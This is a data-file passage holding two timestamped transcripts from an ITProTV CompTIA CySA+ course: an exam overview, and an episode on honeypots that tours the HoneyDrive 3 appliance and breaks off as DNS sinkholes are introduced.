us is Daniel Lowrie, and\nwe're talking about CySA+.\n\n4\n00:00:11.238 --> 00:00:12.785\nDaniel, can you tell us what\nthis course is all about?\n\n5\n00:00:12.785 --> 00:00:13.970\n&gt;&gt; I sure can.\n\n6\n00:00:13.970 --> 00:00:19.216\nToday, we're gonna talk about CySA+, which\nis the CompTIA's cybersecurity analyst\n\n7\n00:00:19.216 --> 00:00:24.290\nplus certification, and it is\na certification based around security,\n\n8\n00:00:24.290 --> 00:00:27.200\nright, because it's part of\ncybersecurity analyst, right,\n\n9\n00:00:27.200 --> 00:00:30.040\nand we're going to talk about a lot of\ninteresting things when it comes to that.\n\n10\n00:00:30.040 --> 00:00:33.316\nIt gives you a couple of domains\nthat are inside of that,\n\n11\n00:00:33.316 --> 00:00:37.989\nthat reasearch out to things like\nincident response, and threat management,\n\n12\n00:00:37.989 --> 00:00:42.731\nand being able to analyze and work with\nthe different type of security issues that\n\n13\n00:00:42.731 --> 00:00:45.685\nyou might encounter as\na cybersecurity analyst.\n\n14\n00:00:45.685 --> 00:00:49.479\nI wanna cover that from soup to nuts,\nand that's what they attempt to do with\n\n15\n00:00:49.479 --> 00:00:50.360\nthe CySA+.\n&gt;&gt; So\n\n16\n00:00:50.360 --> 00:00:53.660\nwho is this show targeted towards?\n&gt;&gt; This show is targeted toward people\n\n17\n00:00:53.660 --> 00:00:57.310\nthat actually have some experience\nwith systems administration,\n\n18\n00:00:57.310 --> 00:00:58.510\nnetwork administration.\n\n19\n00:00:58.510 --> 00:01:02.077\nIt is not for\nthe brand spanking new green horn out\n\n20\n00:01:02.077 --> 00:01:06.084\nthere that just gotten past\ntheir A+ certification.\n\n21\n00:01:06.084 --> 00:01:10.746\nYou must have a bit of experience with\nsome security working with different\n\n22\n00:01:10.746 --> 00:01:15.565\nnetworking tools, operating system tools,\nhave some familiarity there.\n\n23\n00:01:15.565 --> 00:01:20.568\nSo you do have to have some experience\nin the field, not required per say,\n\n24\n00:01:20.568 --> 00:01:26.139\nif you were motivated, you could probably\nstudy all of these different things and\n\n25\n00:01:26.139 --> 00:01:28.963\npass the exam, but it sure does help, and\n\n26\n00:01:28.963 --> 00:01:33.888\nit is geared toward people that have\nbeen out there working in the field as\n\n27\n00:01:33.888 --> 00:01:38.490\na system and/or network administrator,\nmaybe even some security\n\n28\n00:01:38.490 --> 00:01:43.656\nresponsibilities as well to go along\nwith that, and then to prove that set of\n\n29\n00:01:43.656 --> 00:01:46.656\nknowledge you go and you take the CySA+.\n&gt;&gt; All\n\n30\n00:01:46.656 --> 00:01:49.364\nright, so I was just going to say, is\nthere a certification involved with this\n\n31\n00:01:49.364 --> 00:01:49.998\nexam?\n&gt;&gt; There is.\n\n32\n00:01:49.998 --> 00:01:51.550\nThis is no tech skill.\n\n33\n00:01:51.550 --> 00:01:56.460\nThis is an actual cert, and\nyou will get a lovely minted piece of\n\n34\n00:01:56.460 --> 00:02:00.460\npaper that has your name on it, says\nthat you have passed successfully, and\n\n35\n00:02:00.460 --> 00:02:04.290\nyou are certified in these\ntechnologies and techniques.\n\n36\n00:02:04.290 --> 00:02:06.861\nIf we want to,\nwe can actually go to CompTIA's website,\n\n37\n00:02:06.861 --> 00:02:10.235\nwhich I've already pulled up on my\ncomputer, so we can take a look at some of\n\n38\n00:02:10.235 --> 00:02:12.772\nthe details that they give for\nus about the exam itself.\n\n39\n00:02:12.772 --> 00:02:13.570\nSo, let's check that out.\n\n40\n00:02:13.570 --> 00:02:16.659\nLet's go to my computer,\nhere is the opening page, and\n\n41\n00:02:16.659 --> 00:02:20.799\nall you had to do is go to\ncertification.comptia.org/certifications/-\n\n42\n00:02:20.799 --> 00:02:24.489\ncybersecurityanalystoverview, and\nthere we are right there,\n\n43\n00:02:24.489 --> 00:02:28.396\nwell I guess you can read that,\nthat's just cybersecurityanalyst.\n\n44\n00:02:28.396 --> 00:02:31.573\nOnce we get there we get plenty\nof information about this, giving\n\n45\n00:02:31.573 --> 00:02:35.557\nthe overview, which is right here, why is\nit different, it does have this little\n\n46\n00:02:35.557 --> 00:02:39.646\nblurb about the CySA+, so if you were\nstudying for CySA+, this is the same exam.\n\n47\n00:02:39.646 --> 00:02:43.071\nThey've had some legal issues that\nthey've had to rename and rebrand.\n\n48\n00:02:43.071 --> 00:02:44.080\nNot a big deal.\n\n49\n00:02:44.080 --> 00:02:47.100\nIt's just the same product,\na different coat of paint, right?\n\n50\n00:02:47.100 --> 00:02:48.865\nSo a different name on it, not a big deal.\n\n51\n00:02:48.865 --> 00:02:51.790\nAsked why is it's different, the\ndifference is the only intermediate high\n\n52\n00:02:51.790 --> 00:02:55.370\nstakes cybersecurity analyst\ncertification with performance-based\n\n53\n00:02:55.370 --> 00:03:00.080\nquestions covering security analytics,\nintrusion detection, and response.\n\n54\n00:03:00.080 --> 00:03:03.850\nHigh stakes exam are proctored by\nPearson VUE, that's an interesting thing,\n\n55\n00:03:03.850 --> 00:03:05.710\na little factoid you need to know.\n\n56\n00:03:05.710 --> 00:03:10.928\nSo if you want to sign up for the exam\nyou'll be taking it through Pearson VUE.\n\n57\n00:03:10.928 --> 00:03:15.550\nThat's where you'll have to go to\nactually get signed up, all right?\n\n58\n00:03:15.550 --> 00:03:16.578\nThe testing centers and\n\n59\n00:03:16.578 --> 00:03:20.119\nthe CySA+ is the is the most up to date\nsecurity analyst certification that covers\n\n60\n00:03:20.119 --> 00:03:23.684\nadvanced persistent threats in\na post-2014 server security environment.\n\n61\n00:03:23.684 --> 00:03:27.484\nThere's their rundown, giving us more\ninformation about the exam, some\n\n62\n00:03:27.484 --> 00:03:32.144\ncertification pathways, this is actually a\nreally interesting infographic right here.\n\n63\n00:03:32.144 --> 00:03:35.950\nSo, it's telling you about\ncore skills certification.\n\n64\n00:03:35.950 --> 00:03:41.709\nHere we start off with IT fundamentals,\nmoving on to A+, and then to Network+,\n\n65\n00:03:41.709 --> 00:03:47.217\nand to Security+, to show you where this\nfalls in line in the pathway to CASP,\n\n66\n00:03:47.217 --> 00:03:52.657\nwhich is advanced, and then probably\non to something like CISSP after that.\n\n67\n00:03:52.657 --> 00:03:58.716\nBut here you see in the intermediate\nscope you have PenTest+ and CySA+.\n\n68\n00:03:58.716 --> 00:04:02.759\nSo where PenTest+ is geared toward\nthings like red teaming and attack,\n\n69\n00:04:02.759 --> 00:04:07.329\ntrying to PenTesters, that's where they\nwill wanna go if you were on the blue team\n\n70\n00:04:07.329 --> 00:04:10.906\ndefender systems,\nthat's what you would want that CySA+, so\n\n71\n00:04:10.906 --> 00:04:14.172\nthat's where we're looking\nto get into cybersecurity.\n\n72\n00:04:14.172 --> 00:04:17.423\nAs a defender,\nI need to be able to short my systems, so\n\n73\n00:04:17.423 --> 00:04:20.252\nCySA+ is a great exam for\nthat test the skills or\n\n74\n00:04:20.252 --> 00:04:24.240\nlearn new skills that you need to\nknow be successful in that arena.\n\n75\n00:04:25.710 --> 00:04:27.923\nLet's go ahead and zoom back out,\nand we'll keep scrolling down.\n\n76\n00:04:27.923 --> 00:04:29.040\nWhat skills will you learn?\n\n77\n00:04:29.040 --> 00:04:29.996\nThreat management.\n\n78\n00:04:29.996 --> 00:04:30.599\nAll right.\n\n79\n00:04:30.599 --> 00:04:34.253\nApply environment reconnaissance\ntechniques using appropriate tools,\n\n80\n00:04:34.253 --> 00:04:37.446\nanalyzing results, and\nimplementing recommended responses.\n\n81\n00:04:37.446 --> 00:04:38.990\nWe have vulnerability management.\n\n82\n00:04:38.990 --> 00:04:40.870\nImplement vulnerability\nmanagement processes and\n\n83\n00:04:40.870 --> 00:04:46.085\nanalyze the results of vulnerability scan,\nsecure architecture and\n\n84\n00:04:46.085 --> 00:04:49.770\ntoolsets, these are the different\nthings that we are going to do and\n\n85\n00:04:49.770 --> 00:04:54.546\nemploy to make sure that our systems are\nsecure, even working through the software\n\n86\n00:04:54.546 --> 00:04:58.640\ndevelopment lifecycle, well I'm going\nto secure coding best practices.\n\n87\n00:04:58.640 --> 00:05:02.266\nCyber incident responses is if\nthe worst does happen how do we handle\n\n88\n00:05:02.266 --> 00:05:03.166\nthe situation?\n\n89\n00:05:03.166 --> 00:05:05.504\nThey want to make sure that\nyou're prepared for that, so\n\n90\n00:05:05.504 --> 00:05:08.530\nthey add cyber incident response as\none of the skills that you will learn.\n\n91\n00:05:09.560 --> 00:05:12.670\nAll right, then some of the organizations\nthat contribute to the development of\n\n92\n00:05:12.670 --> 00:05:16.820\nCySA, Northrop Grumman,\nRicoh, which makes printers.\n\n93\n00:05:16.820 --> 00:05:20.853\nTarget, I'm sure that they were quick to\njump on the bandwagon after their data\n\n94\n00:05:20.853 --> 00:05:24.522\nbreach, to say, you know what,\ncybersecurity is an important thing,\n\n95\n00:05:24.522 --> 00:05:28.217\nwe should probably do something with that,\nand of course, Dell, LPI.\n\n96\n00:05:28.217 --> 00:05:32.570\nJobs that use CompTIA,\nCySA+: IT Security Analyst.\n\n97\n00:05:32.570 --> 00:05:35.980\nSo, if you’re looking at job postings,\nthese are the types of job listing you\n\n98\n00:05:35.980 --> 00:05:40.400\nwould look for if you are successful\nin obtaining the CySA+.\n\n99\n00:05:40.400 --> 00:05:45.283\nSo, IT security analyst, vulnerability\nanalyst, threat intelligence analyst,\n\n100\n00:05:45.283 --> 00:05:49.691\ncybersecurity analysts, secure\noperations center, or SOC analysts, and\n\n101\n00:05:49.691 --> 00:05:52.700\ncybersecurity specialist and\nsecurity engineer.\n\n102\n00:05:52.700 --> 00:05:55.956\nThose will be all the types\nof jobs you wanna look for.\n\n103\n00:05:55.956 --> 00:06:01.112\nThat is the basic rundown though of\nwhat you can expect to learn and\n\n104\n00:06:01.112 --> 00:06:05.148\nbe tested on when it comes to CySA+.\n&gt;&gt; Thanks Daniel.\n\n105\n00:06:05.148 --> 00:06:08.370\nNow, if CySA+ sounds like something you\nmight be interested in, and it sure should\n\n106\n00:06:08.370 --> 00:06:13.010\nbe, make sure you watch every single\nepisode of CySA+ in our course library.\n\n107\n00:06:13.010 --> 00:06:15.923\nThank you for watching ITProTV,\nwe are binge worthy, thanks.\n\n108\n00:06:15.923 --> 00:06:21.711\n[MUSIC]\n\n",

you live from San Francisco,\nCalifornia.\n\n4\n00:00:07.306 --> 00:00:08.225\n[CROSSTALK]\n\n5\n00:00:08.225 --> 00:00:12.174\n[MUSIC]\n&gt;&gt; You're watching ITProTV.\n\n6\n00:00:12.174 --> 00:00:15.737\n&gt;&gt; Welcome to another great\nepisode right here on ITProTV.\n\n7\n00:00:15.737 --> 00:00:18.690\nYou're watching the CompTIA CySA+ show.\n\n8\n00:00:18.690 --> 00:00:19.980\nI'm your host, Ronnie Wong.\n\n9\n00:00:19.980 --> 00:00:22.820\nAnd today we are taking a look\nat some countermeasures,\n\n10\n00:00:22.820 --> 00:00:27.080\nspecifically talking about,\nwell, honeypots and sinkholes.\n\n11\n00:00:27.080 --> 00:00:30.230\nNow, if you don't know what the difference\nis, well, we're glad that you're here.\n\n12\n00:00:30.230 --> 00:00:34.220\nBecause someone that does know what the\ndifference is, of course, is gonna be Mr.\n\n13\n00:00:34.220 --> 00:00:36.280\nDaniel Lowrie himself,\nour subject matter expert.\n\n14\n00:00:36.280 --> 00:00:37.570\nDaniel, welcome to the show.\n\n15\n00:00:37.570 --> 00:00:38.185\nHow are you doing?\n\n16\n00:00:38.185 --> 00:00:41.800\n&gt;&gt; Ronnie, as always, glad to be\nback here with you good folks and\n\n17\n00:00:41.800 --> 00:00:43.250\nmy main man, Ronnie, over here.\n\n18\n00:00:43.250 --> 00:00:45.340\nWe have a good time every\ntime we do a show together.\n\n19\n00:00:45.340 --> 00:00:49.550\nSo I always look forward to\nhaving Ronnie by my side.\n\n20\n00:00:49.550 --> 00:00:50.690\n&gt;&gt; Well, I appreciate it, Daniel.\n\n21\n00:00:50.690 --> 00:00:53.680\nSame thing here,\nespecially on this topic, right?\n\n22\n00:00:53.680 --> 00:00:56.010\n&gt;&gt; It's a funny title,\nwe were kind of making fun of it earlier.\n\n23\n00:00:56.010 --> 00:00:59.640\n&gt;&gt; Funny title, but this is one of\nthose topics where if you ask five,\n\n24\n00:00:59.640 --> 00:01:02.290\nsix different security professionals,\nyou might-\n\n25\n00:01:02.290 --> 00:01:02.965\n&gt;&gt; You may get five or\n\n26\n00:01:02.965 --> 00:01:03.911\nsix different answers.\n\n27\n00:01:03.911 --> 00:01:07.109\n&gt;&gt; Yeah, you may get five or six different\nanswers, so Daniel, you're going to help\n\n28\n00:01:07.109 --> 00:01:10.110\nus to straighten this out especially\nin getting ready for the exam.\n\n29\n00:01:10.110 --> 00:01:12.625\nBut you're really going to tell us\nwhat the right answer is too, right?\n\n30\n00:01:12.625 --> 00:01:15.840\n&gt;&gt; Exactly, absolutely,\npositively, maybe, right?\n\n31\n00:01:15.840 --> 00:01:16.348\nSo who knows?\n\n32\n00:01:16.348 --> 00:01:19.910\nNo, I'm gonna give you what\nyou need to know for the exam.\n\n33\n00:01:19.910 --> 00:01:24.271\nSo Ronnie's right,\nthere are flavors of these things, so\n\n34\n00:01:24.271 --> 00:01:29.261\nwe're gonna try to boil it down to\nwhat you need to know for the CySA.\n\n35\n00:01:29.261 --> 00:01:31.080\nSo that's what we're doing today.\n\n36\n00:01:31.080 --> 00:01:35.300\nAnd it is fun to say honeypot,\nit is fun to say sinkhole, but\n\n37\n00:01:35.300 --> 00:01:38.695\nthey're also fun to actually work with and\nknow about.\n\n38\n00:01:38.695 --> 00:01:43.510\nThey're very interesting technologies for\nthe purposes of security.\n\n39\n00:01:43.510 --> 00:01:48.590\nNow honeypots have had also\nan interesting history behind them.\n\n40\n00:01:48.590 --> 00:01:49.594\nLet's start off with what they are.\n\n41\n00:01:49.594 --> 00:01:54.385\nA honeypot is a server or\ndevice that you put on your\n\n42\n00:01:54.385 --> 00:01:59.859\nnetwork in a place that will\nmake it look like a legitimate\n\n43\n00:01:59.859 --> 00:02:04.764\npiece of your network infrastructure,\nokay, for\n\n44\n00:02:04.764 --> 00:02:11.700\nthe purposes of giving hackers\nsomething to sink their teeth into.\n\n45\n00:02:11.700 --> 00:02:13.450\nSomething that they will find enticing.\n\n46\n00:02:13.450 --> 00:02:15.190\nHence the term honeypot.\n\n47\n00:02:15.190 --> 00:02:18.206\nThey're gonna start,\nif someone is scanning your network,\n\n48\n00:02:18.206 --> 00:02:22.034\na bad actor out there is scanning your\nnetwork and it's in your DMZ somewhere,\n\n49\n00:02:22.034 --> 00:02:25.180\ncuz typically that's where we\nfind a honeypot, is in your DMZ.\n\n50\n00:02:25.180 --> 00:02:30.210\nAnd they find this honeypot,\nthey're gonna go, there's a server, great.\n\n51\n00:02:30.210 --> 00:02:32.894\nI'm gonna do an end map scan,\nsee what services are available.\n\n52\n00:02:32.894 --> 00:02:38.260\nIt's running DNS, or\nit's got web services started up on it.\n\n53\n00:02:38.260 --> 00:02:41.450\nMaybe it looks like an ICS machine.\n\n54\n00:02:41.450 --> 00:02:45.550\nThat might be interesting to wanna play\naround with, and it looks enticing.\n\n55\n00:02:45.550 --> 00:02:49.290\nNot only that, but the version of it\nis behind, there's a known threat and\n\n56\n00:02:49.290 --> 00:02:51.760\nvulnerability to that machine.\n\n57\n00:02:51.760 --> 00:02:55.840\nThat's a good way that I probably can get\ninto this network, so they attack it.\n\n58\n00:02:55.840 --> 00:02:58.040\nBut it's intentionally, they're right,\n\n59\n00:02:58.040 --> 00:03:01.860\nthat does have that vulnerability\nthat is available to them to exploit.\n\n60\n00:03:01.860 --> 00:03:07.140\nBut it's intentionally put there so\nthat they will gain access to it.\n\n61\n00:03:07.140 --> 00:03:10.220\nAnd not only that, but\nit looks like users are logged in and\n\n62\n00:03:10.220 --> 00:03:14.360\nfiles are being moved around and\nchanged and deleted and created and\n\n63\n00:03:14.360 --> 00:03:20.330\nall of the different things that a real\nproduction server would be doing.\n\n64\n00:03:20.330 --> 00:03:21.880\nIt's going to be doing that.\n\n65\n00:03:21.880 --> 00:03:26.140\nSo to them they think, man, I've really\ngotten a foothold into this network.\n\n66\n00:03:26.140 --> 00:03:29.490\nIt looks legitimate to them, but it's not.\n\n67\n00:03:29.490 --> 00:03:30.950\nWhat it's doing is it's monitoring,\n\n68\n00:03:30.950 --> 00:03:36.400\nit's logging everything that this hacker\nhas done so that we can get a better\n\n69\n00:03:36.400 --> 00:03:42.120\nunderstanding of what kind of attacks and\nthreats are coming against our network.\n\n70\n00:03:42.120 --> 00:03:47.640\nHow they're being employed and\ndone, what are the techniques,\n\n71\n00:03:47.640 --> 00:03:51.150\nwhat are the tactics, what are the tools\nthat are actually happening from\n\n72\n00:03:51.150 --> 00:03:54.970\nreal world scenarios because\nthey've attacked this honey pot.\n\n73\n00:03:54.970 --> 00:03:58.920\nAnd now, we can kind of isolate,\nwe can kind of control, and best of all,\n\n74\n00:03:58.920 --> 00:04:02.340\nwe can monitor and\nlook at what is happening.\n\n75\n00:04:02.340 --> 00:04:05.640\nSo that is the real\nintention of a honeypot and\n\n76\n00:04:05.640 --> 00:04:07.430\nits real power on your network.\n\n77\n00:04:07.430 --> 00:04:09.290\nIt also has an interesting history.\n\n78\n00:04:09.290 --> 00:04:12.860\nFor a while,\nthey were kind of considered entrapment.\n\n79\n00:04:12.860 --> 00:04:14.790\nAnd even had a legal\n\n80\n00:04:16.420 --> 00:04:19.780\nkind of thing going on where people were\nlike this might actually be entrapment.\n\n81\n00:04:19.780 --> 00:04:22.310\nI don't know if this is legal\nthat you should do this.\n\n82\n00:04:22.310 --> 00:04:24.417\nBut we've all come to the end\nof the road apparently-\n\n83\n00:04:24.417 --> 00:04:25.130\n&gt;&gt; [LAUGH]\n\n84\n00:04:25.130 --> 00:04:26.610\n&gt;&gt; And now honeypots are an okay thing.\n\n85\n00:04:26.610 --> 00:04:30.365\nYou can also have honey nets where\nyour whole network are honeypots,\n\n86\n00:04:30.365 --> 00:04:31.600\nif you can go that far.\n\n87\n00:04:32.740 --> 00:04:33.740\nBut they're an okay thing now.\n\n88\n00:04:33.740 --> 00:04:38.260\nPeople see the value in them, and\nso they're employing them more and\n\n89\n00:04:38.260 --> 00:04:39.270\nmore on their networks.\n\n90\n00:04:39.270 --> 00:04:40.740\nSo that's what a honeypot is.\n\n91\n00:04:40.740 --> 00:04:44.850\n&gt;&gt; Now Daniel, I like this idea of the\nhoneypot, because I think it also shows,\n\n92\n00:04:44.850 --> 00:04:49.435\nat least the blue team person that's\nrelatively inexperienced at doing this,\n\n93\n00:04:49.435 --> 00:04:49.970\nright?\n\n94\n00:04:49.970 --> 00:04:52.470\nIs that if you are using\nsomething that is similar,\n\n95\n00:04:52.470 --> 00:04:57.430\nif not the identical production software,\nthat you're running some type of server.\n\n96\n00:04:57.430 --> 00:05:00.620\nIt also shows you the way\nthat the logs would appear\n\n97\n00:05:00.620 --> 00:05:03.770\nin that software as an attack goes on.\n\n98\n00:05:03.770 --> 00:05:07.410\nSo it gives you the practice to be able\nto examine a real attack without actually\n\n99\n00:05:07.410 --> 00:05:09.550\nsaying, well,\nI don't know what it ever looks like.\n\n100\n00:05:09.550 --> 00:05:10.870\nI've never seen one before.\n\n101\n00:05:10.870 --> 00:05:12.110\nWhat does it look like?\n\n102\n00:05:12.110 --> 00:05:13.280\nHow am I supposed to spot this?\n\n103\n00:05:13.280 --> 00:05:16.460\nWell, now they'll say, well, here's\nthe honeypot, at least look at that.\n\n104\n00:05:16.460 --> 00:05:18.612\nNo, go ahead and open up that data center.\n\n105\n00:05:18.612 --> 00:05:21.560\n&gt;&gt; [LAUGH] Yeah, let's go do that and\nallow that to happen, but yes,\n\n106\n00:05:21.560 --> 00:05:22.680\nthis is the idea, right?\n\n107\n00:05:22.680 --> 00:05:25.200\nIs not only able to see\nwhat they're doing, but\n\n108\n00:05:25.200 --> 00:05:26.810\nalso see it on your own equipment.\n\n109\n00:05:26.810 --> 00:05:29.730\nAnd that way it's easier for\nyou to spot and identify.\n\n110\n00:05:29.730 --> 00:05:30.830\nThat's a really great tool.\n\n111\n00:05:30.830 --> 00:05:34.260\n&gt;&gt; Yeah, a couple of the cool things that\nit allows you to do is basically kind of,\n\n112\n00:05:34.260 --> 00:05:36.150\nI mean,\nyou're snooping on the hackers, right?\n\n113\n00:05:36.150 --> 00:05:37.544\n&gt;&gt; Yeah.\n&gt;&gt; You're snooping on the bad,\n\n114\n00:05:37.544 --> 00:05:40.220\nwe'll say threat actors,\ncuz that's a better.\n\n115\n00:05:40.220 --> 00:05:42.390\nYou can be a hacker and\nnot be malicious, so.\n\n116\n00:05:42.390 --> 00:05:44.350\nI typically don't like using that term.\n\n117\n00:05:44.350 --> 00:05:44.920\nSo threat actor, you're snooping on them.\n\n118\n00:05:44.920 --> 00:05:49.230\nYou're finding out more about their\nnetwork, too, because maybe they're\n\n119\n00:05:49.230 --> 00:05:53.404\ndumping malware and that malware is\nphoning home back to a C&amp;C server and so\n\n120\n00:05:53.404 --> 00:05:57.300\nit can get control over the thing,\ntrying to turn it into a bot.\n\n121\n00:05:57.300 --> 00:05:58.350\nI can see where that is.\n\n122\n00:05:58.350 --> 00:06:00.560\nI can start firewalling that off.\n\n123\n00:06:00.560 --> 00:06:03.360\nYou can't go there cuz now\nI know that it exists.\n\n124\n00:06:03.360 --> 00:06:04.830\nAnd that's bad for me.\n\n125\n00:06:04.830 --> 00:06:06.540\nSo really cool on that.\n\n126\n00:06:06.540 --> 00:06:07.930\nNow there is a caveat to this.\n\n127\n00:06:07.930 --> 00:06:13.484\nA hacker actually might, a threat actor\nmight actually take control of this thing,\n\n128\n00:06:13.484 --> 00:06:16.890\nwhich is kinda what you want him to do.\n\n129\n00:06:16.890 --> 00:06:19.670\nAnd they might use it as\nan attack platform, right?\n\n130\n00:06:19.670 --> 00:06:20.460\nSo you gotta be careful.\n\n131\n00:06:20.460 --> 00:06:24.950\nYou gotta really keep an eye\non those monitoring things and\n\n132\n00:06:24.950 --> 00:06:25.900\nsee what's happening.\n\n133\n00:06:25.900 --> 00:06:28.450\nIf they start trying to use it to\njump from one place to another,\n\n134\n00:06:28.450 --> 00:06:30.310\nyou might wanna kill it\nat that point in time.\n\n135\n00:06:30.310 --> 00:06:31.880\nOr just firewall it off completely\n\n136\n00:06:33.430 --> 00:06:38.080\nvia different means that they can't\ncontrol so that it doesn't get used.\n\n137\n00:06:38.080 --> 00:06:40.960\nCuz you would be legally bound and\n\n138\n00:06:40.960 --> 00:06:45.750\nliable if they were able to use your\nhoneypot to attack another company, right?\n\n139\n00:06:45.750 --> 00:06:48.050\nIt was your honeypot, and\nnot only that, but you set it up so\n\n140\n00:06:48.050 --> 00:06:49.410\nthey could take control over it.\n\n141\n00:06:49.410 --> 00:06:54.010\nSo you've got some onus\nthere of responsibility\n\n142\n00:06:54.010 --> 00:06:55.360\nthat is gonna fall in your lap.\n\n143\n00:06:55.360 --> 00:06:58.190\nSo just be aware of that\nif you are deploying them.\n\n144\n00:06:58.190 --> 00:07:01.430\nAnother cool thing also is,\nI don't like to just talk,\n\n145\n00:07:01.430 --> 00:07:03.350\nI like to show as much as I can.\n\n146\n00:07:03.350 --> 00:07:07.290\nI was able to find an ISO,\nnot an ISO, I'm sorry.\n\n147\n00:07:07.290 --> 00:07:10.140\nIt was an OVA.\nIt was an actual appliance already set up\n\n148\n00:07:10.140 --> 00:07:10.810\nand ready to rock.\n\n149\n00:07:10.810 --> 00:07:12.517\nSo if you're running any kind\nof virtualization software,\n\n150\n00:07:12.517 --> 00:07:13.360\nyou can download this thing.\n\n151\n00:07:13.360 --> 00:07:15.800\nIt's called HoneyDrive 3.\n\n152\n00:07:15.800 --> 00:07:19.780\nAnd it is a prebuilt honeypot.\n\n153\n00:07:19.780 --> 00:07:21.520\nSo you can download this rocket and\ntake a look at.\n\n154\n00:07:21.520 --> 00:07:24.940\nI've actually got it installed if you guys\nwanna take a look at what this looks like.\n\n155\n00:07:24.940 --> 00:07:29.603\nAnd one thing you're gonna wanna check out\nis this readme.text cuz it tells you all\n\n156\n00:07:29.603 --> 00:07:32.266\nthe cool stuff and\nkind of some very basic ins and\n\n157\n00:07:32.266 --> 00:07:35.480\nouts of the things that are gonna\nbe found on this system.\n\n158\n00:07:35.480 --> 00:07:39.520\nSo if I open that up, hopefully this\nis good enough for you guys to see.\n\n159\n00:07:39.520 --> 00:07:42.622\nI'm getting it as large as I can.\n\n160\n00:07:42.622 --> 00:07:44.809\nThere we go.\nLet's kind of scroll through this guy\n\n161\n00:07:44.809 --> 00:07:47.890\nhere, giving you some\ninformation about the system.\n\n162\n00:07:47.890 --> 00:07:50.230\nIt's running a full lamp stack.\n\n163\n00:07:50.230 --> 00:07:52.019\nIt gives you the mysql root password.\n\n164\n00:07:52.019 --> 00:07:54.277\nYou'll see a bunch of username and\npasswords for\n\n165\n00:07:54.277 --> 00:07:57.120\nall the different types of\nservices that are running.\n\n166\n00:07:57.120 --> 00:07:59.344\nUsually it's root and honeydrive.\n\n167\n00:07:59.344 --> 00:08:04.045\nHere we go, kippo is a,\nI believe it's an SSH service that is\n\n168\n00:08:04.045 --> 00:08:09.780\nintentionally vulnerable so that people\ncan try to look for brute force.\n\n169\n00:08:09.780 --> 00:08:12.226\nIt's got a front end, Kippo-Graph.\n\n170\n00:08:12.226 --> 00:08:15.530\nKippo-malware, I don't\neven know what that does.\n\n171\n00:08:15.530 --> 00:08:20.658\nKippo mysql, it's probably all just\nbuilt in, a lot of kippo stuff.\n\n172\n00:08:20.658 --> 00:08:24.110\nDionaea, I looked at a bunch\nof these last night.\n\n173\n00:08:24.110 --> 00:08:25.180\nSome of them were really cool.\n\n174\n00:08:25.180 --> 00:08:27.430\nHoneyd is one you're gonna wanna get\nfamiliar with if you're gonna run\n\n175\n00:08:27.430 --> 00:08:27.960\na honeypot.\n\n176\n00:08:27.960 --> 00:08:32.810\nIt's one of the standards, LaBrea I think\nis also in here, it's another standard.\n\n177\n00:08:32.810 --> 00:08:35.620\nThere was one that was really cool,\nconpot.\n\n178\n00:08:35.620 --> 00:08:38.780\nThis was cool, it's ICS SCADA Honeypot, so\n\n179\n00:08:38.780 --> 00:08:42.370\nyou can look like you're an ICS system,\nrunning this guy.\n\n180\n00:08:42.370 --> 00:08:46.530\nWordpot, Thug, PhoneyC,\nthere's Labrea, Tiny Honeypot.\n\n181\n00:08:46.530 --> 00:08:51.140\nSo IIS Emulator, you wanna pretend\nyou're an IIS server, there you go.\n\n182\n00:08:51.140 --> 00:08:52.820\nGreat, cool stuff.\n\n183\n00:08:52.820 --> 00:08:57.310\nAlso in here, let me scroll down,\nis all the security forensics and\n\n184\n00:08:57.310 --> 00:08:59.120\nmalware tools that they\nalso have installed.\n\n185\n00:08:59.120 --> 00:09:03.870\nSo you can analyze, what has happened\nto your honey pop, very cool stuff.\n\n186\n00:09:03.870 --> 00:09:06.560\nAnd there's a litany of things in here.\n\n187\n00:09:06.560 --> 00:09:10.670\nSome of the oldies and goldies, but some\nstuff I've never even heard of before,\n\n188\n00:09:10.670 --> 00:09:15.240\nlike DNS chef, flaw finder,\nI've never seen that one before.\n\n189\n00:09:15.240 --> 00:09:15.960\nSo, cool stuff.\n\n190\n00:09:15.960 --> 00:09:18.750\nAnd you can go in there and\nplay around with them,\n\n191\n00:09:18.750 --> 00:09:21.650\nset up your own little\nvirtual honey network.\n\n192\n00:09:21.650 --> 00:09:25.850\nAnd attack and look at logs and\nsee how it all works out.\n\n193\n00:09:25.850 --> 00:09:31.490\nSo if you wanted to play with a honey\npot in some kind of practical form,\n\n194\n00:09:31.490 --> 00:09:34.890\nhoney drive could be a really\ngood solution for that.\n\n195\n00:09:34.890 --> 00:09:39.560\nSo download that and I'll make sure to\nput the link for it in the, but you know,\n\n196\n00:09:39.560 --> 00:09:44.470\njust use your search engine of\nchoice to find it on the webs there.\n\n197\n00:09:44.470 --> 00:09:47.710\nBut that's the basics\nof what a honey pot is.\n\n198\n00:09:47.710 --> 00:09:52.290\nAn intentionally vulnerable server set\nto look like a legitimate appliance\n\n199\n00:09:52.290 --> 00:09:57.060\non your network for the purposes\nof enticing a threat actor to.\n\n200\n00:09:57.060 --> 00:09:58.160\nCome in.\n\n201\n00:09:58.160 --> 00:09:58.740\nLaunch attacks.\n\n202\n00:09:58.740 --> 00:10:00.120\nSo that we can monitor them.\n\n203\n00:10:00.120 --> 00:10:01.000\nAnd learn from them.\n\n204\n00:10:01.000 --> 00:10:03.510\nTo better secure our environments.\n\n205\n00:10:03.510 --> 00:10:04.330\n&gt;&gt; All right Daniel.\n\n206\n00:10:04.330 --> 00:10:08.290\nSo understanding the idea of the honey\npot is really a great system for us.\n\n207\n00:10:08.290 --> 00:10:11.470\nThat helps a professional be able\nto find a lot of information for\n\n208\n00:10:11.470 --> 00:10:13.790\nthe attack itself.\n\n209\n00:10:13.790 --> 00:10:17.640\nAnd allow us to see the way that it\nalso shows up on our own software.\n\n210\n00:10:17.640 --> 00:10:21.050\nBut Daniel that is only part of\nwhat we entitled this episode.\n\n211\n00:10:21.050 --> 00:10:24.160\nSo let's talk about the idea\nof the sinkhole side of it.\n\n212\n00:10:24.160 --> 00:10:25.700\n&gt;&gt; Yeah, sinkholes are cool.\n\n213\n00:10:25.700 --> 00:10:27.980\nThere are actually a few\ndifferent types of sinkholes.\n\n214\n00:10:27.980 --> 00:10:31.280\nBut for our show we're gonna\ntalk about DNS sinkholes.\n\n215\n00:10:31.280 --> 00:10:34.200\nProbably the most common type of\nsinkhole that you'll encounter,\n\n216\n00:10:34.200 --> 00:10:36.650\nat least in concept if not in practice.\n\n217\n00:10:36.650 --> 00:10:39.850\nAnd what this does,\nit's a really neat concept.\n\n218\n00:10:39.850 --> 00:10:41.450\nSo you have malware, right?\n\n219\n00:10:41.450 --> 00:10:42.290\nPeople get 